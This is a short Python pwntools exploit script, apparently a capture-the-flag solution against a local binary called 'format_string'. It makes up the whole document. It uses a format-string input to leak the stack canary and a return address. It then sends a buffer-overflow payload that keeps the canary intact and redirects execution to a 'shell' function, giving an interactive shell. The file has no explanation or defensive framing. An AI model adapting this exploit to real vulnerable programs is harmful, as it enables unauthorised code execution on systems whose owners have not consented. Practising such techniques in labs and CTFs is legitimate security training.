from pwn import*
p=process('./format_string')
elf=ELF('./format_string')

#context.log_level="debug"
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(proc.pidof(p)[0])

p.recvuntil("name:\n")
string = '%15$x%17$x'
p.sendline(string)
leak =p.recvline()
canary=int(leak[:8],16)
ret=int(leak[8:16],16)

payload='a'*40+p32(canary)+'BBBB'+p32(ret)+p32(elf.symbols['shell'])*20
p.sendline(payload)
p.interactive()
